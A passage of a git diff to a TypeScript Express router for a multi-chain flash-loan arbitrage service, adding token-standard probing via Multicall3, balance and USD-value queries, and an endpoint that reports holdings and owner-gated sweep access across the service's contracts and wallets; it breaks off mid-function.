-    const sortedOpps = [...liveAgent.opportunities].sort((a, b) => {
+    const rawChain = String(req.body?.chain || 'arbitrum').toLowerCase();
+    const targetChain: SupportedArbChain =
+      rawChain === 'base' || rawChain === 'optimism' ? rawChain : 'arbitrum';
+
+    // 1. Run fresh scan on target chain
+    await liveAgent.scan(targetChain);
+    const chainOpps = liveAgent.opportunitiesByChain[targetChain] || [];
+    const sortedOpps = [...chainOpps].sort((a, b) => {
       const execDelta = Number(Boolean(b.contractExecutable)) - Number(Boolean(a.contractExecutable));
       if (execDelta !== 0) return execDelta;
       return b.estNetProfitUsd - a.estNetProfitUsd;
     });
     const opp = req.body?.opportunityId
-      ? liveAgent.opportunities.find((o) => o.id === req.body.opportunityId) || sortedOpps[0]
+      ? chainOpps.find((o) => o.id === req.body.opportunityId) || sortedOpps[0]
       : sortedOpps[0];
 
     if (!opp) {
-      return res.status(400).json({ success: false, error: 'No live pool route found to execute.' });
+      return res.status(400).json({ success: false, error: `No live pool route found to execute on ${RPC_ENDPOINTS[targetChain]?.name || targetChain}.` });
     }
 
     const result = await liveAgent.verifyAndExecuteOpportunity(opp, {
       forceTestExecution: Boolean(req.body?.forceTestExecution),
-      chain: (req.body?.chain as 'arbitrum' | 'base' | 'optimism') || 'arbitrum',
+      chain: targetChain,
     });
 
     if (!result.ok) {
@@ -2122,48 +2433,439 @@ flashArbRouter.post('/agent/verify-receipt', async (req: Request, res: Response)
   }
 });
 
+const CHAIN_ID_HEX_MAP: Record<'arbitrum' | 'base' | 'optimism', string> = {
+  arbitrum: '0xa4b1',
+  base: '0x2105',
+  optimism: '0xa',
+};
+
+const ercProbeIface = new ethers.Interface([
+  'function symbol() view returns (string)',
+  'function decimals() view returns (uint8)',
+  'function totalSupply() view returns (uint256)',
+  'function balanceOf(address account) view returns (uint256)',
+  'function supportsInterface(bytes4 interfaceId) view returns (bool)',
+  'function asset() view returns (address)',
+  'function granularity() view returns (uint256)',
+  'function DOMAIN_SEPARATOR() view returns (bytes32)',
+  'function balanceOf(address account, uint256 id) view returns (uint256)',
+  'function ownerOf(uint256 tokenId) view returns (address)',
+]);
+
+function normalizeExtraAddresses(input: unknown): string[] {
+  if (!Array.isArray(input)) return [];
+  const out: string[] = [];
+  const seen = new Set<string>();
+  for (const item of input) {
+    const s = String(item || '').trim();
+    if (/^0x[a-fA-F0-9]{40}$/.test(s)) {
+      const lower = s.toLowerCase();
+      if (!seen.has(lower)) {
+        seen.add(lower);
+        out.push(ethers.getAddress(s));
+      }
+    }
+  }
+  return out;
+}
+
+function normalizeExtraTokenSpecs(input: unknown): ExtraTokenSpec[] {
+  if (!Array.isArray(input)) return [];
+  const out: ExtraTokenSpec[] = [];
+  const seen = new Set<string>();
+  for (const item of input) {
+    const parsed = parseExtraTokenSpec(item);
+    if (!parsed) continue;
+    const key = `${parsed.address.toLowerCase()}:${parsed.tokenId ?? ''}`;
+    if (!seen.has(key)) {
+      seen.add(key);
+      out.push(parsed);
+    }
+  }
+  return out;
+}
+
+function decodeBoolFlag(entry: any): boolean {
+  if (!entry?.success || typeof entry?.returnData !== 'string' || entry.returnData.length < 66) return false;
+  try {
+    return BigInt(entry.returnData.slice(0, 66)) === 1n;
+  } catch {
+    return false;
+  }
+}
+
+function decodeStringOrBytes32(hex: string | undefined): string | null {
+  if (!hex || hex === '0x') return null;
+  try {
+    const [sym] = ercProbeIface.decodeFunctionResult('symbol', hex);
+    if (sym && String(sym).trim()) return String(sym).trim();
+  } catch {
+    // MKR-style bytes32 symbol fallback
+    if (hex.length === 66) {
+      try {
+        const s = ethers.decodeBytes32String(hex).trim();
+        if (s) return s;
+      } catch {}
+    }
+  }
+  return null;
+}
+
+function getLiveTokenUsdPrice(symbol: string, chain: SupportedArbChain = 'arbitrum'): number | null {
+  const sym = symbol.toUpperCase();
+  if (['USDC', 'USDC.E', 'USDBC', 'USDT', 'DAI', 'FRAX', 'USDE'].includes(sym)) return 1.0;
+  if (sym === 'SUSDE') return 1.12;
+  const preferredPools = liveAgent.poolsByChain[chain] || [];
+  const allPools = [
+    ...preferredPools,
+    ...SUPPORTED_SCAN_CHAINS.flatMap((c) => (c === chain ? [] : liveAgent.poolsByChain[c] || [])),
+  ];
+  const ethPool = allPools.find((p) => p.pair === 'WETH/USDC');
+  const ethUsd = ethPool?.priceUsd || null;
+  if (sym === 'ETH' || sym === 'WETH') return ethUsd;
+  const directPool = allPools.find((p) => p.pair.toUpperCase().startsWith(`${sym}/`));
+  if (directPool && directPool.priceUsd > 0) return directPool.priceUsd;
+  return null;
+}
+
+async function resolveVerifiedTokenList(
+  chain: 'arbitrum' | 'base' | 'optimism',
+  extraSpecsInput: Array<string | ExtraTokenSpec> = []
+): Promise<ArbitrumTokenInfo[]> {
+  const baseList = [...getChainTokens(chain)];
+  const knownKeys = new Set(baseList.map((t) => `${t.addr.toLowerCase()}:${t.tokenId ?? ''}`));
+  const parsedExtras: ExtraTokenSpec[] = [];
+  for (const item of extraSpecsInput) {
+    const spec = typeof item === 'string' ? parseExtraTokenSpec(item) : item;
+    if (!spec) continue;
+    const k = `${spec.address.toLowerCase()}:${spec.tokenId ?? ''}`;
+    if (!knownKeys.has(k)) {
+      knownKeys.add(k);
+      parsedExtras.push(spec);
+    }
+  }
+  if (parsedExtras.length === 0) return baseList;
+
+  const uniqueAddrs = Array.from(new Set(parsedExtras.map((s) => s.address)));
+  const PROBES_PER_ADDR = 8;
+  const calls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
+  for (const addr of uniqueAddrs) {
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('symbol') });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('decimals') });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('totalSupply') });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('supportsInterface', [ERC165_INTERFACE_IDS.ERC1155]) });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('supportsInterface', [ERC165_INTERFACE_IDS.ERC721]) });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('asset') });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('granularity') });
+    calls.push({ target: addr, allowFailure: true, callData: ercProbeIface.encodeFunctionData('DOMAIN_SEPARATOR') });
+  }
+
+  const resolvedByAddr = new Map<string, Omit<ArbitrumTokenInfo, 'tokenId'>>();
+  try {
+    const mcData = multicallIface.encodeFunctionData('aggregate3', [calls]);
+    const { result } = await fetchRpcSingleWithFailover(chain, 'eth_call', [{ to: MULTICALL3_ADDRESS, data: mcData }, 'latest'], false);
+    if (typeof result === 'string' && result !== '0x') {
+      const [decoded] = multicallIface.decodeFunctionResult('aggregate3', result);
+      uniqueAddrs.forEach((addr, idx) => {
+        const base = idx * PROBES_PER_ADDR;
+        const symRes = decoded[base];
+        const decRes = decoded[base + 1];
+        const supplyRes = decoded[base + 2];
+        const erc1155Res = decoded[base + 3];
+        const erc721Res = decoded[base + 4];
+        const assetRes = decoded[base + 5];
+        const granRes = decoded[base + 6];
+        const permitRes = decoded[base + 7];
+
+        const classification = classifyDetectedErcStandard({
+          isErc1155: decodeBoolFlag(erc1155Res),
+          isErc721: decodeBoolFlag(erc721Res),
+          isErc4626: Boolean(assetRes?.success && assetRes.returnData?.length >= 66 && supplyRes?.success),
+          isErc777: Boolean(granRes?.success && granRes.returnData?.length >= 66 && supplyRes?.success),
+          isErc2612: Boolean(permitRes?.success && permitRes.returnData?.length >= 66 && supplyRes?.success),
+          hasErc20TotalSupply: Boolean(supplyRes?.success && supplyRes.returnData?.length >= 66),
+        });
+
+        const parsedSym = decodeStringOrBytes32(symRes?.success ? symRes.returnData : undefined);
+        let parsedDec = 18;
+        if (classification.ercStandard === 'ERC-721' || classification.ercStandard === 'ERC-1155') {
+          parsedDec = 0;
+        } else if (decRes?.success && decRes.returnData && decRes.returnData !== '0x') {
+          try {
+            const [d] = ercProbeIface.decodeFunctionResult('decimals', decRes.returnData);
+            parsedDec = Number(d);
+          } catch {}
+        }
+
+        const fallbackPrefix =
+          classification.ercStandard === 'ERC-1155'
+            ? 'ERC1155'
+            : classification.ercStandard === 'ERC-721'
+            ? 'NFT'
+            : classification.ercStandard === 'UNKNOWN'
+            ? 'UNSUPPORTED'
+            : 'ERC20';
+
+        resolvedByAddr.set(addr.toLowerCase(), {
+          sym: parsedSym || `${fallbackPrefix}_${addr.slice(0, 6)}`,
+          addr,
+          dec: parsedDec,
+          ercStandard: classification.ercStandard,
+          arbCompatible: classification.arbCompatible,
+          sweepCompatible: classification.sweepCompatible,
+          walletSweepCompatible: classification.walletSweepCompatible,
+          compatibilityNote: classification.compatibilityNote,
+        });
+      });
+    }
+  } catch {
+    // ignore metadata resolution failure
+  }
+
+  for (const spec of parsedExtras) {
+    const meta = resolvedByAddr.get(spec.address.toLowerCase()) || {
+      sym: `UNVERIFIED_${spec.address.slice(0, 6)}`,
+      addr: spec.address,
+      dec: 18,
+      ercStandard: 'UNKNOWN' as ErcStandard,
+      arbCompatible: false,
+      sweepCompatible: false,
+      walletSweepCompatible: false,
+      compatibilityNote: 'Unable to probe ERC interface on this chain',
+    };
+    const isNftLike = meta.ercStandard === 'ERC-1155' || meta.ercStandard === 'ERC-721';
+    baseList.push({
+      ...meta,
+      sym: spec.tokenId ? `${meta.sym}#${spec.tokenId}` : meta.sym,
+      tokenId: spec.tokenId,
+      walletSweepCompatible: isNftLike ? Boolean(spec.tokenId) : meta.walletSweepCompatible,
+      compatibilityNote:
+        isNftLike && !spec.tokenId
+          ? `${meta.ercStandard} detected · Append ":tokenId" (e.g. ${spec.address}:1) to inspect balance & sweep from Connected Wallet`
+          : meta.compatibilityNote,
+    });
+  }
+  return baseList;
+}
+
+/**
+ * Helper: Query ETH + all verified chain ERC-20 & probed multi-ERC token balances for an address in one RPC batch.
+ */
+async function queryAllChainBalances(
+  chain: 'arbitrum' | 'base' | 'optimism',
+  targetAddress: string,
+  extraSpecs: Array<string | ExtraTokenSpec> = []
+) {
+  const tokenList = await resolveVerifiedTokenList(chain, extraSpecs);
+  const padded = targetAddress.toLowerCase().replace('0x', '').padStart(64, '0');
+  const erc20BalData = `0x70a08231${padded}`;
+
+  const queryableIndices: number[] = [];
+  const mcCalls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
+  tokenList.forEach((tok, idx) => {
+    const isNftLike = tok.ercStandard === 'ERC-1155' || tok.ercStandard === 'ERC-721';
+    if (isNftLike && !tok.tokenId) {
+      // Cannot query balanceOf without a tokenId; skip RPC call cleanly
+      return;
+    }
+    queryableIndices.push(idx);
+    if (tok.ercStandard === 'ERC-1155' && tok.tokenId) {
+      mcCalls.push({
+        target: tok.addr,
+        allowFailure: true,
+        callData: ercProbeIface.encodeFunctionData('balanceOf(address,uint256)', [targetAddress, BigInt(tok.tokenId)]),
+      });
+    } else if (tok.ercStandard === 'ERC-721' && tok.tokenId) {
+      mcCalls.push({
+        target: tok.addr,
+        allowFailure: true,
+        callData: ercProbeIface.encodeFunctionData('ownerOf(uint256)', [BigInt(tok.tokenId)]),
+      });
+    } else {
+      mcCalls.push({
+        target: tok.addr,
+        allowFailure: true,
+        callData: erc20BalData,
+      });
+    }
+  });
+  const mcData = multicallIface.encodeFunctionData('aggregate3', [mcCalls]);
+
+  let ethWei = 0n;
+  let decodedMcByIdx: Map<number, any> | null = null;
+  try {
+    const { results } = await fetchRpcBatchWithFailover(chain, [
+      { jsonrpc: '2.0', method: 'eth_getBalance', params: [targetAddress, 'latest'], id: 1 },
+      ...(mcCalls.length > 0
+        ? [{ jsonrpc: '2.0', method: 'eth_call', params: [{ to: MULTICALL3_ADDRESS, data: mcData }, 'latest'], id: 2 }]
+        : []),
+    ]);
+    const byId = new Map<number, string>();
+    for (const item of results) {
+      if (item && item.id !== undefined && typeof item.result === 'string' && item.result !== '0x') {
+        byId.set(item.id, item.result);
+      }
+    }
+    ethWei = BigInt(byId.get(1) || '0x0');
+    const mcRaw = byId.get(2);
+    if (mcRaw && mcRaw !== '0x') {
+      const [decoded] = multicallIface.decodeFunctionResult('aggregate3', mcRaw);
+      decodedMcByIdx = new Map<number, any>();
+      queryableIndices.forEach((tokIdx, pos) => {
+        decodedMcByIdx!.set(tokIdx, decoded[pos]);
+      });
+    }
+  } catch {
+    decodedMcByIdx = null;
+  }
+
+  // Fallback to direct RPC batch if Multicall3 failed on an endpoint
+  const directByIdx = new Map<number, string>();
+  if (!decodedMcByIdx) {
+    const calls: any[] = [
+      { jsonrpc: '2.0', method: 'eth_getBalance', params: [targetAddress, 'latest'], id: 1 },
+    ];
+    queryableIndices.forEach((tokIdx, pos) => {
+      calls.push({
+        jsonrpc: '2.0',
+        method: 'eth_call',
+        params: [{ to: mcCalls[pos].target, data: mcCalls[pos].callData }, 'latest'],
+        id: 10 + tokIdx,
+      });
+    });
+    const { results } = await fetchRpcBatchWithFailover(chain, calls);
+    for (const item of results) {
+      if (item && item.id !== undefined && typeof item.result === 'string' && item.result !== '0x') {
+        if (item.id === 1) ethWei = BigInt(item.result);
+        else directByIdx.set(item.id - 10, item.result);
+      }
+    }
+  }
+
+  const checksumTarget = ethers.getAddress(targetAddress).toLowerCase();
+  const tokens: Array<{
+    symbol: string;
+    address: string;
+    decimals: number;
+    ercStandard: ErcStandard;
+    tokenId?: string;
+    rawBalance: bigint;
+    formatted: string;
+    hasBalance: boolean;
+    arbCompatible: boolean;
+    sweepCompatible: boolean;
+    walletSweepCompatible: boolean;
+    compatibilityNote: string;
+    usdValue: number | null;
+  }> = [];
+
+  tokenList.forEach((tok, idx) => {
+    const mcEntry = decodedMcByIdx?.get(idx);
+    let hex: string | null = null;
+    if (mcEntry?.success && typeof mcEntry?.returnData === 'string' && mcEntry.returnData !== '0x') {
+      hex = mcEntry.returnData;
+    } else if (directByIdx.has(idx)) {
+      hex = directByIdx.get(idx) || null;
+    }
+
+    let rawBalance = 0n;
+    let balanceReadable = true;
+    const isNftLike = tok.ercStandard === 'ERC-1155' || tok.ercStandard === 'ERC-721';
+
+    if (isNftLike && !tok.tokenId) {
+      rawBalance = 0n;
+    } else if (tok.ercStandard === 'ERC-721' && tok.tokenId) {
+      if (hex && hex.length >= 66) {
+        const tokenOwner = `0x${hex.slice(-40)}`.toLowerCase();
+        rawBalance = tokenOwner === checksumTarget ? 1n : 0n;
+      } else if (mcEntry && !mcEntry.success) {
+        rawBalance = 0n; // non-existent / burned tokenId
+      }
+    } else if (hex && hex.length >= 66) {
+      try {
+        rawBalance = BigInt(hex.slice(0, 66));
+      } catch {
+        balanceReadable = false;
+      }
+    } else if (mcEntry && !mcEntry.success) {
+      balanceReadable = false;
+    }
+
+    const formatted =
+      tok.ercStandard === 'ERC-721' || tok.ercStandard === 'ERC-1155'
+        ? rawBalance.toString()
+        : ethers.formatUnits(rawBalance, tok.dec);
+    const numBal = Number(formatted);
+    const priceUsd = isNftLike ? null : getLiveTokenUsdPrice(tok.sym, chain);
+    const usdValue = priceUsd !== null && Number.isFinite(numBal) ? Number((numBal * priceUsd).toFixed(4)) : null;
+
+    tokens.push({
+      symbol: tok.sym,
+      address: tok.addr,
+      decimals: tok.dec,
+      ercStandard: tok.ercStandard || 'ERC-20',
+      ...(tok.tokenId ? { tokenId: tok.tokenId } : {}),
+      rawBalance,
+      formatted,
+      hasBalance: rawBalance > 0n,
+      arbCompatible: Boolean(tok.arbCompatible) && balanceReadable,
+      sweepCompatible: (tok.sweepCompatible !== false) && balanceReadable,
+      walletSweepCompatible: (tok.walletSweepCompatible ?? (tok.sweepCompatible !== false)) && balanceReadable,
+      compatibilityNote: !balanceReadable
+        ? 'Incompatible: token contract balance query reverted on this chain'
+        : tok.compatibilityNote || 'ERC-20 · Sweep Compatible',
+      usdValue,
+    });
+  });
+
+  const ethFormatted = ethers.formatEther(ethWei);
+  const ethPrice = getLiveTokenUsdPrice('ETH', chain);
+  const ethUsd = ethPrice !== null ? Number((Number(ethFormatted) * ethPrice).toFixed(2)) : null;
+
+  return {
+    ethWei,
+    ethFormatted,
+    ethUsd,
+    tokens,
+  };
+}
+
 /**
  * GET /api/flash-arb/wallet-balances
- * Queries real-time on-chain token balances of the Profit Vault (ETH, WETH, USDC, USDT) on Arbitrum One
+ * Queries real-time on-chain ETH + all verified ERC-20 token balances of the Profit Vault
  */
 flashArbRouter.get('/wallet-balances', async (req: Request, res: Response) => {
   try {
+    const chainRaw = String(req.query.chain || 'arbitrum').toLowerCase();
+    const chain: 'arbitrum' | 'base' | 'optimism' =
+      chainRaw === 'base' || chainRaw === 'optimism' ? chainRaw : 'arbitrum';
+    const rpcInfo = RPC_ENDPOINTS[chain] || RPC_ENDPOINTS.arbitrum;
     const address = String(req.query.address || profitWalletEnv()).trim();
     if (!address || !/^0x[a-fA-F0-9]{40}$/i.test(address)) {
       return res.status(400).json({ success: false, error: 'Invalid EVM address' });
     }
+    const extraTokens = normalizeExtraTokenSpecs(
+      typeof req.query.extraTokens === 'string' ? req.query.extraTokens.split(',') : []
+    );
 
-    // Direct RPC Batch: ETH balance + WETH + USDC + USDT with multi-endpoint failover
-    const cleanAddrPadded = address.toLowerCase().replace('0x', '').padStart(64, '0');
-    const balData = `0x70a08231${cleanAddrPadded}`;
+    const balInfo = await queryAllChainBalances(chain, address, extraTokens);
+    const ethBalance = Number(balInfo.ethFormatted);
+    const findBal = (sym: string) => {
+      const entry = balInfo.tokens.find((t) => t.symbol.toUpperCase() === sym.toUpperCase());
+      return entry ? Number(entry.formatted) : 0;
+    };
+    const wethBalance = findBal('WETH');
+    const usdcBalance = findBal('USDC');
+    const usdtBalance = findBal('USDT');
 
-    const { results: data } = await fetchRpcBatchWithFailover('arbitrum', [
-      { jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 },
-      // WETH (0x82aF49447D8a07e3bd95BD0d56f35241523fBab1)
-      { jsonrpc: '2.0', method: 'eth_call', params: [{ to: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', data: balData }, 'latest'], id: 2 },
-      // USDC (0xaf88d065e77c8cC2239327C5EDb3A432268e5831)
-      { jsonrpc: '2.0', method: 'eth_call', params: [{ to: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', data: balData }, 'latest'], id: 3 },
-      // USDT (0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9)
-      { jsonrpc: '2.0', method: 'eth_call', params: [{ to: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', data: balData }, 'latest'], id: 4 },
-    ]);
-    const ethWei = BigInt(data[0]?.result || '0x0');
-    const wethWei = BigInt(data[1]?.result || '0x0');
-    const usdcUnits = BigInt(data[2]?.result || '0x0');
-    const usdtUnits = BigInt(data[3]?.result || '0x0');
-
-    const ethBalance = Number(ethWei) / 1e18;
-    const wethBalance = Number(wethWei) / 1e18;
-    const usdcBalance = Number(usdcUnits) / 1e6;
-    const usdtBalance = Number(usdtUnits) / 1e6;
-
-    // Approximate live WETH price
-    const liveWethPrice = liveAgent.pools[0]?.priceUsd || 2362.5;
-    const totalUsd = (ethBalance * liveWethPrice) + (wethBalance * liveWethPrice) + usdcBalance + usdtBalance;
+    const tokenUsdTotal = balInfo.tokens.reduce((sum, t) => sum + (t.hasBalance && t.usdValue ? t.usdValue : 0), 0);
+    const totalUsd = (balInfo.ethUsd ?? 0) + tokenUsdTotal;
 
     return res.json({
       success: true,
       address,
-      chain: 'Arbitrum One',
+      chain: rpcInfo.name,
+      chainKey: chain,
       balances: {
         eth: ethBalance,
         ethFormatted: `${ethBalance.toFixed(6)} ETH`,
@@ -2174,8 +2876,35 @@ flashArbRouter.get('/wallet-balances', async (req: Request, res: Response) => {
         usdt: usdtBalance,
         usdtFormatted: `${usdtBalance.toFixed(2)} USDT`,
       },
+      tokens: balInfo.tokens.map((t) => ({
+        symbol: t.symbol,
+        address: t.address,
+        decimals: t.decimals,
+        ercStandard: t.ercStandard,
+        tokenId: t.tokenId,
+        balance: t.formatted,
+        hasBalance: t.hasBalance,
+        arbCompatible: t.arbCompatible,
+        sweepCompatible: t.sweepCompatible,
+        walletSweepCompatible: t.walletSweepCompatible,
+        compatibilityNote: t.compatibilityNote,
+        usdValue: t.usdValue,
+      })),
+      nonZeroTokens: balInfo.tokens
+        .filter((t) => t.hasBalance)
+        .map((t) => ({
+          symbol: t.symbol,
+          address: t.address,
+          ercStandard: t.ercStandard,
+          tokenId: t.tokenId,
+          balance: t.formatted,
+          usdValue: t.usdValue,
+          arbCompatible: t.arbCompatible,
+          sweepCompatible: t.sweepCompatible,
+          walletSweepCompatible: t.walletSweepCompatible,
+        })),
       totalUsd: Number(totalUsd.toFixed(2)),
-      explorerUrl: `https://arbiscan.io/address/${address}`,
+      explorerUrl: `${rpcInfo.explorer}/address/${address}`,
       timestamp: Date.now(),
     });
   } catch (err: any) {
@@ -2184,83 +2913,26 @@ flashArbRouter.get('/wallet-balances', async (req: Request, res: Response) => {
 });
 
 /**
- * Helper: Query ETH + all Arbitrum ERC-20 token balances for an address in one RPC batch.
- */
-async function queryAllArbitrumBalances(chain: 'arbitrum' | 'base' | 'optimism', targetAddress: string) {
-  const tokenList = chain === 'arbitrum' ? Object.values(ARBITRUM_TOKENS) : [ARBITRUM_TOKENS.WETH, ARBITRUM_TOKENS.USDC];
-  const padded = targetAddress.toLowerCase().replace('0x', '').padStart(64, '0');
-  const balData = `0x70a08231${padded}`;
-
-  const calls: any[] = [
-    { jsonrpc: '2.0', method: 'eth_getBalance', params: [targetAddress, 'latest'], id: 1 },
-  ];
-  if (chain === 'arbitrum') {
-    tokenList.forEach((tok, idx) => {
-      calls.push({
-        jsonrpc: '2.0',
-        method: 'eth_call',
-        params: [{ to: tok.addr, data: balData }, 'latest'],
-        id: 10 + idx,
-      });
-    });
-  }
-
-  const { results } = await fetchRpcBatchWithFailover(chain, calls);
-  const byId = new Map<number, string>();
-  for (const item of results) {
-    if (item && item.id !== undefined && typeof item.result === 'string' && item.result !== '0x') {
-      byId.set(item.id, item.result);
-    }
-  }
-
-  const ethWei = BigInt(byId.get(1) || '0x0');
-  const { ethers } = await import('ethers');
-  const tokens: Array<{
-    symbol: string;
-    address: string;
-    decimals: number;
-    rawBalance: bigint;
-    formatted: string;
-  }> = [];
-
-  if (chain === 'arbitrum') {
-    tokenList.forEach((tok, idx) => {
-      const hex = byId.get(10 + idx);
-      const rawBalance = hex ? BigInt(hex) : 0n;
-      tokens.push({
-        symbol: tok.sym,
-        address: tok.addr,
-        decimals: tok.dec,
-        rawBalance,
-        formatted: ethers.formatUnits(rawBalance, tok.dec),
-      });
-    });
-  }
-
-  return {
-    ethWei,
-    ethFormatted: ethers.formatEther(ethWei),
-    tokens,
-  };
-}
-
-/**
  * GET /api/flash-arb/contract-balances
- * Queries live ETH + all ERC-20 token balances sitting on the active FlashArb contract,
- * plus inspects contract owner() and selector support (executeOptimizedArbitrage / rescueTokensTo).
+ * Queries live ETH + all verified ERC-20 token balances sitting on the active FlashArb contract,
+ * plus inspects contract owner() and selector support (executeOptimizedArbitrage / rescueTokensTo / rescueTokens).
  */
 flashArbRouter.get('/contract-balances', async (req: Request, res: Response) => {
   try {
-    const chain = (String(req.query.chain || 'arbitrum').toLowerCase() as 'arbitrum' | 'base' | 'optimism');
+    const chainRaw = String(req.query.chain || 'arbitrum').toLowerCase();
+    const chain: 'arbitrum' | 'base' | 'optimism' =
+      chainRaw === 'base' || chainRaw === 'optimism' ? chainRaw : 'arbitrum';
     const rpcInfo = RPC_ENDPOINTS[chain] || RPC_ENDPOINTS.arbitrum;
     const contractAddr = String(req.query.address || DEPLOYED_CONTRACTS[chain] || '').trim();
     if (!/^0x[a-fA-F0-9]{40}$/.test(contractAddr)) {
       return res.status(400).json({ success: false, error: 'Invalid contract address' });
     }
+    const extraTokens = normalizeExtraTokenSpecs(
+      typeof req.query.extraTokens === 'string' ? req.query.extraTokens.split(',') : []
+    );
 
-    const { ethers } = await import('ethers');
     const [balInfo, codeResp, ownerResp] = await Promise.all([
-      queryAllArbitrumBalances(chain, contractAddr),
+      queryAllChainBalances(chain, contractAddr, extraTokens),
       fetchRpcSingleWithFailover(chain, 'eth_getCode', [contractAddr, 'latest'], true),
       fetchRpcSingleWithFailover(chain, 'eth_call', [{ to: contractAddr, data: '0x8da5cb5b' }, 'latest'], true).catch(() => ({ result: null })),
     ]);
@@ -2282,14 +2954,22 @@ flashArbRouter.get('/contract-balances', async (req: Request, res: Response) => 
       supportsOptimizedArbitrage: code.includes('23b3aa6b'),
       supportsRescueTokensTo: code.includes('a7070692'),
       supportsRescueTokens: code.includes('ae3bf8'),
+      supportsDirectSweep: code.includes('7804d9ac'),
       eth: balInfo.ethFormatted,
       ethWei: balInfo.ethWei.toString(),
+      ethUsd: balInfo.ethUsd,
       tokens: balInfo.tokens.map((t) => ({
         symbol: t.symbol,
         address: t.address,
         decimals: t.decimals,
+        ercStandard: t.ercStandard,
+        tokenId: t.tokenId,
         balance: t.formatted,
-        hasBalance: t.rawBalance > 0n,
+        hasBalance: t.hasBalance,
+        arbCompatible: t.arbCompatible,
+        sweepCompatible: t.sweepCompatible,
+        compatibilityNote: t.compatibilityNote,
+        usdValue: t.usdValue,
       })),
       nonZeroCount: (balInfo.ethWei > 0n ? 1 : 0) + balInfo.tokens.filter((t) => t.rawBalance > 0n).length,
       explorerUrl: `${rpcInfo.explorer}/address/${contractAddr}`,
@@ -2301,20 +2981,218 @@ flashArbRouter.get('/contract-balances', async (req: Request, res: Response) => 
 });
 
 /**
+ * GET /api/flash-arb/holdings-overview
+ * Connects and inspects ALL token holdings across active & legacy FlashArb contracts, Gas Wallet,
+ * optional Connected Web3 Wallet, and Profit Destination Vault, including contract compatibility flags.
+ */
+flashArbRouter.get('/holdings-overview', async (req: Request, res: Response) => {
+  try {
+    const chainRaw = String(req.query.chain || 'arbitrum').toLowerCase();
+    const chain: 'arbitrum' | 'base' | 'optimism' =
+      chainRaw === 'base' || chainRaw === 'optimism' ? chainRaw : 'arbitrum';
+    const rpcInfo = RPC_ENDPOINTS[chain] || RPC_ENDPOINTS.arbitrum;
+
+    const rawContracts = typeof req.query.contracts === 'string' ? req.query.contracts.split(',') : [];
+    const defaultExtras =
+      chain === 'arbitrum'
+        ? ['0xeee31ff9e69904b43c124095b6f33aa61505bcc2', '0x19359c6C418669FCfC46196970814353b8766BE0']
+        : [];
+    const contractAddrs = normalizeExtraAddresses([
+      DEPLOYED_CONTRACTS[chain],
+      ...rawContracts,
+      ...defaultExtras,
+    ]);
+
+    const gasWallet = String(req.query.gasWallet || gasWalletEnv() || '').trim();
+    const profitWallet = String(req.query.profitWallet || profitWalletEnv() || '').trim();
+    const connectedWallet = String(req.query.connectedWallet || '').trim();
+    const extraTokens = normalizeExtraTokenSpecs(
+      typeof req.query.extraTokens === 'string' ? req.query.extraTokens.split(',') : []
+    );
+
+    const signerKey = (process.env.FLASH_ARB_SIGNER_KEY || '').trim();
+    const signerAddress = signerKey
+      ? new ethers.Wallet(signerKey.startsWith('0x') ? signerKey : `0x${signerKey}`).address
+      : null;
+
+    const contracts = await Promise.all(
+      contractAddrs.map(async (addr) => {
+        const [balInfo, codeResp, ownerResp] = await Promise.all([
+          queryAllChainBalances(chain, addr, extraTokens),
+          fetchRpcSingleWithFailover(chain, 'eth_getCode', [addr, 'latest'], true),
+          fetchRpcSingleWithFailover(chain, 'eth_call', [{ to: addr, data: '0x8da5cb5b' }, 'latest'], true).catch(() => ({ result: null })),
+        ]);
+        const code = String(codeResp.result || '0x').toLowerCase();
+        const isDeployed = code !== '0x' && code.length > 2;
+        const contractOwner =
+          typeof ownerResp.result === 'string' && ownerResp.result.length >= 66
+            ? ethers.getAddress(`0x${ownerResp.result.slice(-40)}`)
+            : null;
+        const ownerMatchesSigner = Boolean(
+          signerAddress && contractOwner && contractOwner.toLowerCase() === signerAddress.toLowerCase()
+        );
+        const ownerMatchesConnectedWallet = Boolean(
+          /^0x[a-fA-F0-9]{40}$/.test(connectedWallet) &&
+            contractOwner &&
+            contractOwner.toLowerCase() === connectedWallet.toLowerCase()
+        );
+        const nonZeroTokens = balInfo.tokens.filter((t) => t.hasBalance);
+        const compatibleNonZeroTokens = nonZeroTokens.filter((t) => t.sweepCompatible);
+
+        return {
+          address: addr,
+          isPrimary: addr.toLowerCase() === (DEPLOYED_CONTRACTS[chain] || '').toLowerCase(),
+          isDeployed,
+          owner: contractOwner,
+          ownerMatchesSigner,
+          ownerMatchesConnectedWallet,
+          accessibleForSweep: isDeployed && (ownerMatchesSigner || ownerMatchesConnectedWallet),
+          supportsOptimizedArbitrage: code.includes('23b3aa6b'),
+          supportsRescueTokensTo: code.includes('a7070692'),
+          supportsRescueTokens: code.includes('ae3bf8'),
+          supportsDirectSweep: code.includes('7804d9ac'),
+          eth: balInfo.ethFormatted,
+          ethWei: balInfo.ethWei.toString(),
+          ethUsd: balInfo.ethUsd,
+          nonZeroTokens: nonZeroTokens.map((t) => ({
+            symbol: t.symbol,
+            address: t.address,
+            decimals: t.decimals,
+            ercStandard: t.ercStandard,
+            tokenId: t.tokenId,
+            balance: t.formatted,
+            arbCompatible: t.arbCompatible,
+            sweepCompatible: t.sweepCompatible,
+            compatibilityNote: t.compatibilityNote,
+            usdValue: t.usdValue,
+          })),
+          compatibleNonZeroCount: (balInfo.ethWei > 0n ? 1 : 0) + compatibleNonZeroTokens.length,
+          explorerUrl: `${rpcInfo.explorer}/address/${addr}`,
+        };
+      })
+    );
+
+    const walletInspect = async (addr: string) => {
+      if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return null;
